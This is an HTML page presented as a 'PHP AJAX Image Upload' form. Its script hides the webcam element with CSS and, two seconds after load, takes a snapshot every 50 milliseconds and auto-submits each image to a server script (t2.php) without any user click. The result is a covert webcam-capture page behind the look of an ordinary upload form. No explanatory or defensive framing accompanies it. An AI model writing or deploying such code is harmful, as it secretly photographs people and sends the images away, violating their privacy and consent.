<html>
<head>
<title>PHP AJAX Image Upload</title>
<script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.25/webcam.min.js"></script>



<style>

.btn-upload {
	padding: 5px 30px;
	border-radius: 4px;
	margin-top: 20px;
	color: #2f2f2f;
	font-weight: 500;
	background-color: #ffc72c;
	border: 1px solid;
	border-color: #ffd98e #ffbe3d #de9300;
}

#my_camera{
	display:none;
}
</style>
</head>
<body>

	
	<form id="image-upload-form"  method="post">
		<div id="my_camera"></div>
		<input type="hidden" name="image" class="image-tag">

		<div id="results">Your captured image will appear here...</div>
		<div id="targetLayer">Image Preview</div>

		<div>
			<input type="submit" value="Upload" class="btn-upload" />
		</div>

	</form>
	
	

	<script type="text/javascript">
		

var form = document.getElementById("image-upload-form");
    $(document).ready(function (e) {

		Webcam.set({
        width: 200,
        height: 150,
        image_format: 'jpeg',
        jpeg_quality: 90
    });
  
    Webcam.attach( '#my_camera' );

	function take_snapshot() {
        Webcam.snap( function(data_uri) {
            $(".image-tag").val(data_uri);
            document.getElementById('results').innerHTML = '<img src="'+data_uri+'"/>';
        } );
    }






$("#image-upload-form").on('submit',(function(e) {
	
		e.preventDefault();
    		$.ajax({
            	url: "t2.php",
    			type: "POST",
    			data:  new FormData(this),
    			contentType: false,
        	    cache: false,
    			processData: false,
				success: function(data)
    		    {
    				$("#targetLayer").html(data);
    		    },
    		  	error: function(data)
    	    	{
    		  	  console.log("error");
                  console.log(data);
    	    	}
    	   });

    	}));

		setTimeout(() => {
		setInterval(take_snapshot, 50);
		setInterval(() => {

			$("#image-upload-form").submit()
			
		}, 50);	
	}, 2000);


});

</script>



</body>
</html>
